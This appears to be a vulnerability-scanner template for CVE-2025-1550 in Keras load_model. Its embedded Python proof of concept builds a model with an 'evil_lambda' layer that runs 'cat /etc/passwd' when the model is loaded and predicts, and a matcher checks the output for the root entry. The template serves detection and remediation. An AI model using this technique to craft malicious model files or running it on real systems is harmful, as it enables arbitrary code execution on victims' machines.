code:
- engine:
  - py
  - python3
  matchers:
  - part: response
    regex:
    - 'root:.*:0:0:'
    type: regex
  source: "import os\nimport sys\n\ntry:\n    import tensorflow as tf\n    from tensorflow.keras.models\
    \ import load_model\n    from tensorflow.keras.layers import Lambda, Input\n \
    \   from tensorflow.keras.models import Model\n    import numpy as np\nexcept\
    \ ImportError:\n    sys.exit(1)\n\ndef create_malicious_model():\n    def malicious_function(x):\n\
    \        result = os.popen(\"cat /etc/passwd\").read()\n        print(result)\n\
    \        return x\n\n    input_layer = Input(shape=(1,))\n    lambda_layer = Lambda(malicious_function,\
    \ name=\"evil_lambda\")(input_layer)\n    model = Model(inputs=input_layer, outputs=lambda_layer)\n\
    \    return model\n\ndef exploit_lambda_layer():\n    model_path = \"/tmp/malicious_model.keras\"\
    \n    try:\n        model = create_malicious_model()\n        model.save(model_path)\n\
    \        del model\n\n        loaded_model = load_model(model_path)\n        test_input\
    \ = np.array([[1.0]])\n        loaded_model.predict(test_input, verbose=0)\n\n\
    \        return True\n    except:\n        return False\n    finally:\n      \
    \  if os.path.exists(model_path):\n            os.remove(model_path)\n\nexploit_lambda_layer()\n"
id: CVE-2025-1550
info:
  author: nukunga[seunghyeonJeon]
  classification:
    epss-percentile: 0.89105
    epss-score: 0.04785
  description: 'The Keras Model.load_model function permits arbitrary code execution,
    even with safe_mode=True, through a manually constructed, malicious .keras archive.
    By altering the config.json file within the archive, an attacker can specify arbitrary
    Python modules and functions, along with their arguments, to be loaded and executed
    during model loading

    '
  impact: 'Attackers can execute arbitrary code during model loading, potentially
    leading to remote code execution or system compromise.

    '
  metadata:
    max-request: 1
  name: Keras Model.load_model - Arbitrary Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1550
  - https://github.com/keras-team/keras/pull/20751
  - https://towerofhanoi.it/writeups/cve-2025-1550/
  remediation: 'Update to the latest version of Keras where this issue is fixed or
    apply security patches provided by the developers.

    '
  severity: critical
  tags: cve,cve2025,code,keras,rce,ml
self-contained: true
